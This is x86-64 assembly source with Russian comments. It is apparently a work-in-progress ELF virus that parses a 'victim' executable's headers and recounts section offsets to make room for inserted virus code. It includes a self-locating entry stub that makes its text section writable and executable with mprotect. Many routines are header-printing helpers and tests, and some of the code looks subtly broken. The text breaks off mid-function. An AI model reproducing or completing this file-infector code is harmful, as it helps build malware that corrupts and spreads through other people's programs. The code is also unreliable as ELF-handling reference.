.macro STACK_MASQUE reg
    mov $~0x3FF, \reg
.endm

.macro ADDR_MASQUE reg
    mov $0xF, \reg
.endm

    # макросы для доступа к полям структуры ElfHdr
    # в reg принимает адрес, по которому лежит заголовок, кладет значение поля в reg2
.macro ELF_E_ENTRY reg, reg2
    add $0x18, \reg
    mov (\reg), \reg2
.endm

.macro ELF_E_PHOFF reg, reg2
	    add $0x20, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_SHOFF reg, reg2
	    add $0x28, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_PHNUM reg, reg2
	    add $0x38, \reg
.endm

.macro ELF_E_SHNUM reg, reg2
	    add $0x3c, \reg
.endm

    # макросы для доступа к полям структуры Phdr
.macro PHDR_P_OFFSET reg, reg2
    add $0x8, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_VADDR reg, reg2
    add $0x10, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_PADDR reg, reg2
    add $0x18, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_FILESZ reg, reg2
    add $0x20, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_MEMSZ reg, reg2
    add $0x28, \reg
	mov (\reg), \reg2
.endm

    .text
 	.globl	_start
	.type	_start, @function

file_name:
    .string  "test.txt"

file_name2:
    .string  "asm-test2.txt"

file_name3:
    .string  "ex"

msg:
    .string "write test string \n"

msg2:
    .string "fwrite test string \n"

# сообщения, которые будут использоваться при распечатке полей эльф-хедера
e_type_msg:
    .string "ElfHdr e_type: "
e_machine_msg:
    .string "ElfHdr e_machine: "
e_version_msg:
    .string "ElfHdr e_version: "
e_entry_msg:
    .string "ElfHdr e_entry: "
e_phoff_msg:
    .string "ElfHdr e_phoff: "
e_shoff_msg:
    .string "ElfHdr e_shoff: "
e_ehsize_msg:
    .string "ElfHdr e_ehsize: "
e_flags_msg:
    .string "ElfHdr e_flags: "
e_phentsize_msg:
    .string "ElfHdr e_phentsize: "
e_phnum_msg:
    .string "ElfHdr e_phnum: "
e_shentsize_msg:
    .string "ElfHdr e_shentsize: "
e_shnum_msg:
    .string "ElfHdr e_shnum: "
e_shstrndx_msg:
    .string "ElfHdr e_shstrndx: "

 # сообщения, которые будут использоваться при распечатке полей заголовка программ
p_type_msg:
    .string "PhHdr p_type: "
p_flags_msg:
    .string "PhHdr p_flags: "
p_offset_msg:
    .string "PhHdr p_offset: "
p_vaddr_msg:
    .string "PhHdr p_vaddr: "
p_paddr_msg:
    .string "PhHdr p_paddr: "
p_filesz_msg:
    .string "PhHdr p_filesz: "
p_memsz_msg:
    .string "PhHdr p_memsz: "
p_align_msg:
    .string "PhHdr p_align: "

# сообщения, которые будут использоваться при распечатке полей заголовка секций
sh_name_msg:
    .string "ShHdr sh_name: "
sh_type_msg:
    .string "ShHdr sh_type: "
sh_flags_msg:
    .string "ShHdr sh_flags: "
sh_addr_msg:
    .string "ShHdr sh_addr: "
sh_offset_msg:
    .string "ShHdr sh_offset: "
sh_size_msg:
    .string "ShHdr sh_size: "
sh_link_msg:
    .string "ShHdr sh_link: "
sh_info_msg:
    .string "ShHdr sh_info: "
sh_addralign_msg:
    .string "ShHdr sh_addralign: "
sh_entsize_msg:
    .string "ShHdr sh_entsize: "

next_str:
    .string "\n"


stat_struct_sz:
    .int 160
Ehdr_struct_sz:
    .int 64
Phdr_struct_sz:
    .int 56
Shdr_struct_sz:
    .int 64


    # макросы для того, чтоб положить флаги в регистр
.macro O_RDONLY reg
    mov $0x0, \reg
.endm

.macro O_RDWR reg
    mov $0x2, \reg
.endm

.macro PROT_READ reg
    mov $0x1, \reg
.endm

.macro PROT_READ_OR_PROT_WRITE reg
    mov $0x3, \reg
.endm

.macro PROT_NONE reg
    mov $0x0, \reg
    .endm

.macro MAP_PRIVATE reg
    mov $0x2, \reg
.endm

elf_malware_addr:
    .long 0

elf_victim_addr:
    .long 0


_start:
    call _start2

_start2:
    pop %rax        # взяли адрес _start2 и coхранили его

    STACK_MASQUE %rdi

    mov %rax, %rdx

    and %rdi, %rax  # выровняли его
    mov %rax, %rcx  # сохранили выровненный адрес

    call stack_end

_count_memory:

    pop %rsi        # взяли адрес stack_end
    mov %rsi, %r8   # сохранили его

    sub %rcx, %rsi  # посчитали размер памяти (от выровненного адреса до конца программы)

    mov %rcx, %rdi
    mov $7, %rdx
    mov $10, %rax  # вызвали mprotect, чтоб разрешить запись в секцию text

    syscall

    mov $5, %rax
    sub %rax, %r8
    mov %r8, %rsp

    #call    test_open
    #call    test_write
    #call    test_fopen
    #call    test_memcpy
    #call    test_fread
    #call    test_fwrite
    #call    test_cnvrt_num_to_hex_string
    #call    test_cnvrt_addr_in_16_byte
    #call    test_my_printf1
    #call    test_my_printf2
    #call    test_my_printf3
    #call    test_read_elf_header
    #call    test_read_program_header
    #call    test_read_section_header
    #call    test_read_all_program_headers
    #call    test_read_all_section_headers
    #call    test_find_last_segment_header

    call     test_shdr_offset_and_addr_recount
exit:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

    # читает данные из памяти
    # принимает в rdi адрес, куда будут записаны данные
    # в rsi - адрес, откуда данные чистаются
    # в rdx - размер данных
    .globl  read_code
	.type	read_code, @function
read_code:
    push    %rbx

    mov     %rdx, %rbx
    mov     $0x1, %rdx
    call    fread

    pop     %rbx
    ret

    # ищет заголовок последнего сегмента кода
    # последний сегмент - это сегмент, чей offset + size находится дальше
    # offset + size прочих сегментов
    # принимает в rdi указатель на таблицу заголовков программ
    # в rsi - количество заголовков
    # возвращает указатель на  заголовок последнего сегмента
find_last_segment_header:
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9

    mov     %rsi, %rcx
    mov     %rdi, %r8

find_last_segment_header_cycle:
    mov     %rdi, %rax

    PHDR_P_OFFSET %rdi, %rdx   # считаем offset + size текущего загоовка
    mov     %rax, %rdi

    PHDR_P_FILESZ %rdi, %rsi
    add     %rsi, %rdx
    mov     %rdx, %r9

    mov     %r8,  %rdi        # считаем offset + size сохраненного заголовка
    PHDR_P_OFFSET %rdi, %rdx

    mov     %r8, %rdi
    PHDR_P_FILESZ %rdi, %rsi
    add     %rsi, %rdx

    cmp     %rdx, %r9
    jl      next_iter

    mov      %rax, %r8
next_iter:

    mov   %rax, %rdi
    add   $0x38, %rdi

    loop find_last_segment_header_cycle

    mov    %r8, %rax

    pop    %r9
    pop    %r8
    pop    %rdx
    pop    %rcx

    ret

test_find_last_segment_header:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_find_last_segment_header_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul    %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     %rax, %rcx

    call    find_last_segment_header

    mov     %rax, %rdi
    call    print_program_header

    add     %rcx,  %rsp

test_find_last_segment_header_end:
    pop %rbp
    ret

    # читает заголовок эльфа из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, в rdi - указатель,
    # на память,куда будет записан  заголовок
elf_header_victim:
    .space 0x40,0

    .globl  read_elf_header
	.type	read_elf_header, @function

read_elf_header:
    push    %rbx
    push    %rdx

    mov     $0x1, %rdx
    mov     $0x40, %rbx

    call    fread

    pop     %rdx
    pop     %rbx

    ret

    # читает заголовок пргграммы из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
    # таблицы заголовков программы, в rdi - указатель на место под записья
program_header:
    .space 0x38,0

    .globl  read_program_header
	.type	read_program_header, @function

read_program_header:
    push %rbx
    push %rdx

    mov  $0x1, %rdx
    mov  $0x38, %rbx

    call fread

    pop  %rdx
    pop  %rbx

    ret

    # принимает в edi указатель на структуру заголовка программы и выводит его поля

    .globl  print_program_header
	.type	print_program_header, @function

print_program_header:

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    mov     %rdi, %rcx

	movl	(%rcx), %esi
    mov     $p_type_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xE, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $p_flags_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    mov 	(%rcx), %rsi
    mov     $p_offset_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_vaddr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_paddr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_filesz_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_memsz_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_align_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    ret

test_read_program_header:

    mov     $file_name3, %rdi
    O_RDONLY  %rsi
    call    fopen

    cmp     $0, %rax

    jle     test_read_program_header_end

    mov     %rax, %rdi
    mov     %rdi,  %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi
    mov     $program_header, %rdi
    call    read_program_header

    mov     $program_header, %rdi
    call    print_program_header

test_read_program_header_end:
    ret

    # читает все заголовки програм
    # принимает в rdi адрес, по которому должны быть записаны заголовки
    # в rsi - адрес, по которому лежат заголвки в памяти
    # в rdx - количество заголовков
    .globl  read_all_program_headers
	.type	read_all_program_headers, @function

read_all_program_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    mov     %rdx, %rcx
read_all_program_headers_cycle:

    call    read_program_header

    loop    read_all_program_headers_cycle
    pop     %rcx

    pop     %rbp
    ret

    # принимает в rdi aдрес, по которому лежат заголовки
    # в rsi - их количество

    .globl  print_all_program_headers
	.type	print_all_program_headers, @function

print_all_program_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    push    %r8
    push    %rdx
    push    %rax

    mov     %rsi, %rcx

print_all_program_headers_cycle:

    mov     %rdi, %rax

    call    print_program_header

    mov     $next_str, %rdi
    mov     $0x0, %rdx
    mov     $0x1, %r8

    call    my_printf

    mov     %rax, %rdi
    add     $0x38, %rdi

    loop    print_all_program_headers_cycle

    pop     %rax
    pop     %rdx
    pop     %r8
    pop     %rcx

    pop     %rbp
    ret

test_read_all_program_headers:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_all_program_headers_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_program_headers
    add     %rax,  %rsp

test_read_all_program_headers_end:
    pop %rbp
    ret

    # пересчитывает смещения и адреса секций, которые будут находиться после
    #  вставленного в жертву вируса
    # т.е. если вирус вставляется после тысячного байта в эльф-жертву, то все,
    # что находится после него, должно быть смещено на размер кода вируса.
    # поэтому мы будем пересчитывать адреса и смещения для всех секций, которые
    # находятся после той точки, кда вставлялся вирус и менять заголовки секций
    # ( менять заголовки программ не придется, поскольку вирус вставляется после
    #   последнего сегмента кода )

    # принимает в rdi  указатель на заголовки,
    # в rsi - их количество, в rdx - смещение, точка, по которой будет записан вирус,
    # в rcx - сколько байт занимает вирус

    .globl  shdr_offset_and_addr_recount
    .type	shdr_offset_and_addr_recount, @function

recount_msg:
    .string "after recount: \n"

shdr_offset_and_addr_recount:

    push  %r8

    mov   %rcx, %r8
    mov   %rsi, %rcx        # установили счетчик цикла

shdr_offset_and_addr_recount_cycle:

    add   $0x18, %rdi

    cmp   %rdx,  (%rdi)

    jl    next_iter_recount

    add   %r8, (%rdi)   # пересчитываем адрес и смещение

    sub   $8, %rdi

    cmp   $0, (%rdi)
    jle   mov_addr_to_offset_field

    add   %r8, (%rdi)

mov_addr_to_offset_field:

    add   $8, %rdi

next_iter_recount:

    add   $0x28, %rdi
    loop shdr_offset_and_addr_recount_cycle

    pop  %r8

    ret

test_shdr_offset_and_addr_recount:

    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_shdr_offset_and_addr_recount_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_section_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_section_headers

    mov     %rcx, %r9

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     $0xe10, %rdx
    mov     $0x3e8, %rcx

    call    shdr_offset_and_addr_recount

    mov     $recount_msg,%rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x10, %r8
    call    my_printf

    lea     (%rsp), %rdi
    mov     %r9, %rsi
    call    print_all_section_headers

    add     %rax,  %rsp

test_shdr_offset_and_addr_recount_end:
    pop %rbp

    ret
    # читает заголовок секции из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
    # таблицы заголовков секций, в rdi - указательн на память, куда будет записан
    # заголовок
section_header:
    .space 0x40, 0

    .globl  read_section_header
	.type	read_section_header, @function

read_section_header:
    push %rbx
    push %rdx

    mov  $0x1, %rdx
    mov  $0x40, %rbx

    call fread

    pop  %rdx
    pop  %rbx

    ret
    # принимает в rdi указатель на структуру заголовка секции
    # печатает все поля секции
print_section_header:

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    mov     %rdi, %rcx

	movl	(%rcx), %esi
    mov     $sh_name_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $sh_type_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $sh_flags_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_addr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_offset_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x11, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_size_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_link_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_info_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl 	(%rcx), %esi
    mov     $sh_addralign_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call	my_printf

    add     $0x8, %rcx

    movl 	(%rcx), %esi
    mov     $sh_entsize_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call	my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    ret
test_read_section_header:

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax

    jle     test_read_section_header_end

    mov     %rax, %rdi
    mov     %rdi,  %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi
    mov     $section_header, %rdi
    call    read_section_header

    mov     $section_header, %rdi
    call    print_section_header
test_read_section_header_end:
    ret

    # читает все заголовки секций
    # принимает в rdi адрес, по которому должны быть записаны заголовки
    # в rsi - адрес, по которому лежат заголвки в памяти
    # в rdx - количество заголовков
    .globl  read_all_section_headers
	.type	read_all_section_headers, @function

read_all_section_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    mov     %rdx, %rcx
read_all_section_headers_cycle:

    call    read_section_header

    loop    read_all_section_headers_cycle
    pop     %rcx

    pop     %rbp
    ret

    # принимает в rdi aдрес, по которому лежат заголовки
    # в rsi - их количество

    .globl  print_all_section_headers
	.type	print_all_section_headers, @function

print_all_section_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    push    %r8
    push    %rdx
    push    %rax

    mov     %rsi, %rcx

print_all_section_headers_cycle:

    mov     %rdi, %rax

    call    print_section_header

    mov     $next_str, %rdi
    mov     $0x0, %rdx
    mov     $0x1, %r8

    call    my_printf

    mov     %rax, %rdi
    add     $0x40, %rdi

    loop    print_all_section_headers_cycle

    pop     %rax
    pop     %rdx
    pop     %r8
    pop     %rcx

    pop     %rbp
    ret

test_read_all_section_headers:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_all_section_headers_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_section_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_section_headers
    add     %rax,  %rsp

test_read_all_section_headers_end:
    pop %rbp
    ret

    # принимает указатель на структуру заголовка эльфа и выводит все его поля
    .globl  print_elf_header
	.type	print_elf_header, @function

    # принимает в rdi указатель на структуру эльф-хедера
print_elf_header:
    push    %rbp
    mov     %rsp, %rbp

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    add     $0x10, %rdi
    mov     %rdi, %rcx

    mov     $e_type_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx,  %edx
    mov     %edx,  %esi
    mov     $0x10, %rdx
    mov     $0xf, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_machine_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx,  %edx
    mov     %edx,  %esi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_version_msg, %rdi
    movzwl  (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call    my_printf

    add     $4, %rcx

    mov     $e_entry_msg, %rdi
    movzwl  (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $8, %rcx

    mov     $e_phoff_msg, %rdi
    mov     (%rcx), %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $8, %rcx

    mov     $e_shoff_msg, %rdi
    mov     (%rcx), %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $8, %rcx

    mov     $e_ehsize_msg, %rdi
    movl    (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x11, %r8
    call    my_printf

    add     $4, %rcx

    mov     $e_flags_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0xf, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_phentsize_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_phnum_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shentsize_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shnum_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shstrndx_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x13, %r8
    call    my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    pop     %rbp
    ret

test_read_elf_header:

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_elf_header_end
    mov     %rax, %rsi
    mov     %rax, %rdx
    mov     $elf_header_victim, %rdi
    call    read_elf_header

    mov     $elf_header_victim, %rdi
    call    print_elf_header

    mov     %rdx, %rdi
    call    close
test_read_elf_header_end:
    ret

    # конвертирует число в строку для вывода числа в шеcтнадцатеричном формате
    # принимает в rsi адрес на массив, в котором записано число
converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function
    #.param  ptr_array_num, gr # %rsi

cnvrt_num_to_hex_string:
    push    %rax
    push    %rsi
    push    %rdi
    push    %rcx
    push    %rdx

    mov     $converted_addr, %rdi

    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    mov     $converted_addr, %rdi

    mov     $0x10, %rcx

cnvrt_num_cycle:

    xor     %rax, %rax
    movb    (%rsi), %al
    cmp     $0x09, %rax
    jg      cnvrt_in_letter

    add     $0x30,  %al    # конвертируем в числовое представление
    jmp     continue_cycle

cnvrt_in_letter:
    add     $0x57, %al    # конвертируем в буквенное представление

continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rdx
    popq    %rcx
    popq    %rdi
    popq    %rsi
    popq    %rax

	ret

test_cnvrt_num_to_hex_string:

    pushq   %rbp
	movq    %rsp, %rbp

    mov     $byted_addr, %rdi
    mov     $0x10, %rsi

    call    clear_array
    mov     $byted_addr, %rsi

    movb    $0x01, (%rsi)

    call    cnvrt_num_to_hex_string

    mov     $0x0, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx
    call    write

    popq    %rbp
	ret

 # принимает в rdi адрес массив, в rsi - его размер, заполняет массив нулями
clear_array:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:

    pop     %rcx
    popq    %rbp
	ret

    # принимает в rdi строку, которую нужно вывести,
    # в rsi - число для вывода
    # в rdx - основание системы счисления, в которой надо вывести число
    # или 0, если вывода числа нет,
    # в r8 - размер строки, если она есть
my_printf:
    push    %rcx
    push    %rax
    push    %rdx

    mov     %rdi, %rcx
    mov     %rsi, %rax

    cmp     $0, %rdx
    je      print_string

    cmp     $16, %rdx
    je      cnvrt_hex_num

    jmp     print_string

cnvrt_hex_num:
    mov     $byted_addr, %rdi   # очищаем массив (там могло быть другое число)
    mov     $0x10, %rsi

    call    clear_array

    mov     $converted_addr, %rdi
    mov     $0x11, %rsi

    call    clear_array

    mov     %rax, %rdi               # забираем число со стека
    call    cnvrt_addr_in_16_byte

    mov     $byted_addr, %rsi
    call    cnvrt_num_to_hex_string   # преобразовываем в строку

print_string:
    mov     %rcx, %rsi # забрали строку

    cmp     $0, %rsi
    je      print_num

    mov     $0, %rdi

    mov     %r8, %rdx
    call    write

print_num:
    pop     %rdx      # забрали снование системы счисления
    cmp     $0, %rdx
    je      my_printf_end

    xor     %rdi, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx

    call    write

my_printf_end:
    pop     %rax
    pop     %rcx
	ret

test_my_printf1:
    mov     $msg, %rdi
    mov     $0x3041d23e2, %rsi
    mov     $0x10, %rdx
    mov     $0x13, %r8

    call    my_printf
	ret

test_my_printf2:
    mov     $0x0, %rdi
    mov     $0x3041d23e2, %rsi
    mov     $0x10, %rdx
    mov     $0x0, %r8

    call    my_printf

    ret

test_my_printf3:

    mov     $msg, %rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x13, %r8

    call    my_printf
	ret

    # принимает в rdi адрес/число, который нужно конвертировать из 8 байт в 16
    # на выходе получаем то же самое число, но каждые полбайта записаны в целый байт
byted_addr:
    .space  20, 0

cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rax
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    mov     %rdi, %rdx
    mov     $byted_addr, %rsi

    add     $0xF, %rsi
    mov     $0x10, %rcx

    mov     $0x0, %r8

    ADDR_MASQUE %rbx

cnvrt_addr_cycle:

    and     %rbx, %rdx

    mov     %rcx, %r9
    xor     %rcx, %rcx

mov_num_cycle:
    cmp     %r8, %rcx
    jge     mov_num_end

    shr     $0x4, %rdx
    inc     %rcx
    jmp     mov_num_cycle

mov_num_end:
    mov     %r9, %rcx
    movb    %dl, (%rsi)

    mov     %rdi, %rdx
    shl     $0x4, %rbx

    dec     %rsi
    inc     %r8

    loop   cnvrt_addr_cycle

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %rax
    pop     %r9
    pop     %r8

    ret

test_cnvrt_addr_in_16_byte:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $0x40, %rdi
    call    cnvrt_addr_in_16_byte

    mov     $byted_addr, %rsi
    call    cnvrt_num_to_hex_string

    mov     $0, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx

    call    write

    popq    %rbp
	ret

test_open:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rdi
    push    %rax
    push    %rsi


    mov     $file_name, %rdi
    O_RDONLY %rsi
    call    open

    pop    %rsi
    pop    %rax
    pop    %rdi

    popq    %rbp
	ret

test_write:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rdi
    push    %rax
    push    %rsi
    push    %rdx

    mov     $file_name, %rdi
    O_RDWR  %rsi

    call    open

    push    %rax
    mov     %rax, %rdi
    mov     $msg, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdi
    call    close

    pop     %rdx
    pop     %rsi
    pop     %rax
    pop     %rdi

    popq    %rbp
	ret

test_fwrite:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $array, %rdi
    mov     $msg, %rsi
    mov     $19, %rdx

    call    fwrite

    mov     %rax, %rdi
    mov     $msg2, %rsi
    mov     $20, %rdx
    call    fwrite

    mov     $0, %rdi
    mov     $array, %rsi
    mov     $39, %rdx

    call    write
    popq    %rbp
	ret

# цель теста смаппить содержимое файла в память и вывести из памяти в stdout
test_fopen:

    push    %rdi
    push    %rax
    push    %rsi
    push    %rdx

    mov     $file_name, %rdi
    O_RDWR  %rsi
    call    fopen

    mov     $0, %rdi
    mov     %rax, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdx
    pop     %rsi
    pop     %rax
    pop     %rdi

	ret

# цель теста скопировать строку в массив и вывести ее оттуда в stdout
test_memcpy:
    pushq   %rbp
	movq    %rsp, %rbp

    subq	$32, %rsp

    movq 	$array, %rdi
	movq	$msg, %rsi
    mov     $19, %rdx

    call    memcpy

    mov     $0, %rdi
    mov     $array, %rsi
    mov     $19, %rdx

    call    write
    add     $32, %rsp
    popq    %rbp
	ret

# цель теста:
# смаппить содержимое file_name в память, прочитать  данные из памяти в массив
# записать их в file_name2
test_fread:

    mov     $file_name, %rdi
    O_RDWR  %rsi

    call    fopen

    cmp     $0, %rax
    jle     test_fread_end

    mov     $array, %rdi  # читаем в массив
    mov     %rax, %rsi
    mov     $1, %rdx
    mov     $19, %rbx

    call    fread

    mov     $file_name2, %rdi
    O_RDWR  %rsi

    call    open

    push    %rax  # сохранили дескриптор на открытый файл

    mov     %rax, %rdi
    mov     $array, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdi
    call    close

test_fread_end:
	ret

# принимает в rdi имя файла
# в rsi - флаги
open:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $2, %rax
